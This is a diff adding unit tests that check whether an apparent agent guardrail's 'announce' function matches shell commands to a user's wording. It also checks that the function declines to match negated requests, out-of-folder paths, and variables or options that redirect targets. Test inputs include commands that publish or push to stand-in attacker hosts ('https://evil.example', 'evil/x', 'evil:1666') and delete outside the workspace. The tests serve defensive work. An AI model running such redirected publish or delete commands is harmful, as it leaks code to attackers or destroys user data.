@@ -215,3 +215,36 @@ describe("mentioned", () => {
     expect(mentioned(findings("sudo apt install x"), "use sudo for it")).toBe(true);
   });
 });
+
+describe("matchIntent: words that don't ask, and objects the words don't name exactly", () => {
+  it("never announces when the user's words turn the request around", () => {
+    for (const words of ["don't delete notes.txt", "do not delete notes.txt", "never remove notes.txt", "delete nothing, not even notes.txt", "keep everything except notes.txt"]) {
+      expect(announce("rm notes.txt", words), words).toBeNull();
+    }
+    expect(announce("rm notes.txt", "delete notes.txt")).not.toBeNull();
+  });
+
+  it("names a path by its last segment only inside the task's folder, and a written path only where it leads", () => {
+    expect(announce("rm -r src/build", "delete the build folder")).not.toBeNull();
+    expect(announce("rm -r ../build", "delete the build folder")).toBeNull();
+    expect(announce("rm -r ~/build", "delete the build folder")).toBeNull();
+    expect(announce("rm -r lib/build", "delete the src/build folder")).toBeNull();
+    expect(announce("rm -r ~/build", "delete the ~/build folder")).not.toBeNull();
+    expect(announce("ls > ../out.txt", "write the list to out.txt")).toBeNull();
+  });
+
+  it("asks when a variable is set in the command or an option comes before the verb", () => {
+    expect(announce("GH_REPO=evil/x gh pr create", "open a pull request")).toBeNull();
+    expect(announce("export GH_REPO=evil/x; gh pr create", "open a pull request")).toBeNull();
+    expect(announce("gh pr create", "open a pull request")).not.toBeNull();
+    expect(announce("p4 -p evil:1666 submit -c 7", "submit changelist 7")).toBeNull();
+    expect(announce("npm --registry https://evil.example publish", "publish it")).toBeNull();
+  });
+
+  it("asks for a pkill wider than the names, another image, or a pull request the command doesn't number", () => {
+    expect(announce("pkill -f node", "kill node")).toBeNull();
+    expect(announce("docker push evil/app", "push the image app")).toBeNull();
+    expect(announce("gh pr merge", "merge pr 12")).toBeNull();
+    expect(announce("git checkout HEAD~3 -- a.ts", "discard changes to a.ts")).toBeNull();
+  });
+});
